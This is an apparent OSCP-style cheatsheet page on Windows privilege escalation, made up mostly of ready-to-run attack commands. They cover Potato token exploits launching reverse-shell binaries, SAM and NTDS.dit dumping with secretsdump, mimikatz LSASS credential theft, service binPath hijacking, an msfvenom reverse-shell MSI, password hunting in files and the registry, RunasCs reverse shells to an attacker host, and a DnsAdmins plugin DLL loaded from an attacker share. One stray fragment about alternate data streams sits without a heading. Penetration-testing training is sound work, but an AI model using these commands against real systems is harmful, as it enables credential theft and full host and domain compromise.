# 04 · Windows Privilege Escalation

> Part of the **OSCP/OSCP+ cheatsheet** | [← back to index](README.md)

> More: [host baseline](windows/host-enumeration.md) · [service binaries](windows/service-binary-hijacking.md) · [service permissions](windows/service-permissions.md) · [unquoted paths](windows/unquoted-service-paths.md) · [DLL hijacking](windows/dll-hijacking.md) · [token rights](windows/token-groups.md) · [Potato privilege escalation](windows/potato.md) · [NT hashes](windows/ntlm.md)

---

## WINDOWS PRIVILEGE ESCALATION

### Enumerate
```powershell
# Automated
.\winPEASany.exe                 # or winpeas.bat
.\PrivescCheck.ps1; Invoke-PrivescCheck
.\Seatbelt.exe -group=all
# Manual
whoami /all                      # PRIVILEGES = gold (SeImpersonate, SeBackup, etc.)
whoami /priv
systeminfo                       # OS/patches -> wesng / windows-exploit-suggester
net user; net localgroup administrators; net user <me>
ipconfig /all; route print; netstat -ano        # internal -> pivot
cmdkey /list                     # stored creds -> runas /savecred
```
```bash
# from your box, map patch level to exploits
python wesng.py systeminfo.txt
```

### SeImpersonate / SeAssignPrimaryToken → Potato (very common service-account → SYSTEM)
```powershell
# Pick by Windows version. If whoami /priv shows SeImpersonatePrivilege:
.\PrintSpoofer64.exe -i -c cmd                      # Win10/2016/2019 - reliable
.\PrintSpoofer64.exe -c "C:\rev.exe"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"           # broad coverage incl 2019/2022
.\JuicyPotatoNG.exe -t * -p C:\rev.exe              # newer JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\rev.exe -t * -c {CLSID}   # 2016/older
.\RoguePotato.exe -r LHOST -e "C:\rev.exe" -l 9999
# These are the #1 path off web/service shells. Carry all of them.
```

### SeBackupPrivilege / SeRestorePrivilege
```powershell
# Backup SAM+SYSTEM then secretsdump offline:
reg save HKLM\SAM sam.hive ; reg save HKLM\SYSTEM system.hive
# DC: copy NTDS.dit via diskshadow/robocopy then secretsdump
diskshadow /s script.txt    # create shadow, robocopy ntds.dit + SYSTEM
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

### Service misconfigurations
```powershell
# List service paths (wmic is available on older builds)
wmic service get name,pathname,startmode
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName
# Unquoted path: test the exact prefix filenames and their parent directories
# C:\Program Files\My App\svc.exe -> C:\Program.exe or C:\Program Files\My.exe
sc.exe qc <svc>
# Service configuration rights (can change binPath)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *      # or use winPEAS output
sc.exe config <svc> binPath= "C:\rev.exe"
sc.exe stop <svc>   # only with SERVICE_STOP
sc.exe query <svc>  # wait until stopped
sc.exe start <svc>  # only with SERVICE_START; restore original binPath
# Writable service binary: back it up, replace it, and use an available trigger
```

### AlwaysInstallElevated
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# both = 1 ->
msiexec /quiet /qn /i evil.msi     # msfvenom -f msi -p windows/x64/shell_reverse_tcp...
```

### Scheduled tasks / startup / autoruns
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run Author"
# writable task binary or script run as SYSTEM -> replace
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run    # autorun + writable target
```

### DLL hijacking
- App loads a DLL from a writable/missing path → drop a malicious DLL (msfvenom `-f dll`). Find with ProcMon (offline analysis) or known-missing-DLL lists.

### Credential hunting (always do this)
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml ; type C:\Windows\system32\sysprep\*.xml
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # autologon creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
# Stored / Wi-Fi / browser
cmdkey /list ; netsh wlan show profile name=X key=clear
# LSASS / SAM
reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"
```

### Run as another user with creds (RunasCs: no interactive desktop needed)
Have creds for another account but no interactive logon? `runas` needs a desktop and fails from a reverse shell: RunasCs doesn't:
```powershell
.\RunasCs.exe <user> <pass> "cmd /c whoami"
.\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
.\RunasCs.exe <user> <pass> cmd.exe -d corp.example -r LHOST:443   # domain account
.\RunasCs.exe <user> <pass> cmd.exe --bypass-uac -r LHOST:443    # if <user> is a local admin
# PowerShell-only host (nothing on disk):
Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
```
Also the move to pivot a service-account shell to a discovered user account.

 `dir /R`, `more < file:stream`, `type ... > file:hidden`.
- **machineKey / ViewState:** a leaked `web.config` machine key can undermine ViewState protection. Check the application's signing settings and the actual server-side parser before claiming code execution.
- **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
- UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).

### PowerUp (classic automated PE checks)
```powershell
. .\PowerUp.ps1
Invoke-AllChecks                        # runs every check at once
Get-ModifiableServiceFile ; Get-UnquotedService ; Find-PathDLLHijack
```
Use PowerUp for discovery. Check the service and change its files manually.

### Privileged group membership → SYSTEM/DA  (check `whoami /groups`, `net localgroup`)
```powershell
# Backup Operators -> SeBackupPrivilege: read SAM+SYSTEM (or NTDS on DC) then secretsdump
reg save hklm\sam sam ; reg save hklm\system system        # -> impacket-secretsdump LOCAL
# DnsAdmins -> load malicious DLL into dns.exe (runs SYSTEM on the DC):
dnscmd <dc> /config /serverlevelplugindll \\LHOST\share\evil.dll
sc.exe \\<dc> stop dns & sc.exe \\<dc> start dns
# Server Operators -> change a service binPath, start it (SYSTEM):
sc config <svc> binPath= "C:\rev.exe" & sc stop <svc> & sc start <svc>
# Print Operators -> SeLoadDriverPrivilege -> load Capcom.sys driver -> SYSTEM
# Account Operators -> create/modify non-protected accounts (add to nested groups)
# Hyper-V Admins, Event Log Readers (grep logs for creds), DPAPI/cred vaults
```

### Other token privileges (`whoami /priv`)
```
SeLoadDriverPrivilege     -> load vulnerable signed driver (Capcom.sys) -> SYSTEM
SeManageVolumePrivilege   -> investigate a manual file-write path
SeTakeOwnershipPrivilege  -> take ownership of a SYSTEM binary/file, then replace/read it
SeDebugPrivilege          -> procdump/mimikatz into lsass; inject into SYSTEM process
SeRestorePrivilege        -> overwrite protected files (utilman.exe / sethc.exe sticky-keys trick)
SeImpersonate/SeAssignPrimaryToken -> Potato (see above)   SeBackup -> reg save / NTDS
```

### AV / AMSI quick checks

If a transferred tool does not run, first check whether it arrived intact and whether Defender blocked the file or the PowerShell content. A different filename alone is not a reliable bypass.

```powershell
Get-MpComputerStatus
Get-MpPreference | Select-Object Exclusion*
```

Loading a prepared script without saving the `.ps1` avoids a file write, but AMSI can still inspect PowerShell content. Test the exact method on the target; do not assume an in-memory load is invisible.

---
